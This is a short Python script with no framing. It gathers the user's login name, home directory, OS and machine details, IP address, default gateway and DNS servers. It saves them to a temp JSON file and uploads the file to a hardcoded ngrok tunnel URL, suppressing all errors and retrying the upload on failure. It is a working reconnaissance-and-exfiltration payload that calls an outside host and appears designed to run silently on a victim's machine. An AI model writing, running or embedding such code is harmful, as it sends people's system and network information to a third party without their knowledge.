import os
import platform
import json
import requests
import socket
import subprocess
import time
SERVER_URL = "http://ringtail-careful-supposedly.ngrok-free.app:5000/endpoint"
JSON_FILE_PATH = "/tmp/network_info.json"
def collect_user_info():
    user_info = {
        "username": os.getlogin(),
        "home_directory": os.path.expanduser("~"),
        "system": platform.system(),
        "node_name": platform.node(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
    }
    return user_info

def collect_network_info():
    network_info = {}
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        network_info["ip_address"] = ip_address
    except:
        network_info["ip_address"] = "Unknown"
    try:
        gateway = subprocess.check_output(["ip", "route", "show", "default"]).decode().split()[2]
        network_info["gateway"] = gateway
    except:
        network_info["gateway"] = "Unknown"
    try:
        with open("/etc/resolv.conf", "r") as f:
            dns_servers = [line.split()[1] for line in f if line.startswith("nameserver")]
        network_info["dns_servers"] = dns_servers
    except:
        network_info["dns_servers"] = "Unknown"
    return network_info
def save_to_json(data, file_path):
    try:
        with open(file_path, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        pass

def send_to_server(file_path, server_url):
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(server_url, files=files)
            if response.status_code == 200:
                #nagyon fasza
                pass
            else:
                time.sleep(30)
                send_to_server(JSON_FILE_PATH, SERVER_URL)

    except Exception as e:
        pass

def main():
    user_info = collect_user_info()
    network_info = collect_network_info()
    combined_info = {**user_info, **network_info}
    save_to_json(combined_info, JSON_FILE_PATH)
    send_to_server(JSON_FILE_PATH, SERVER_URL)
if __name__ == "__main__":
    main()
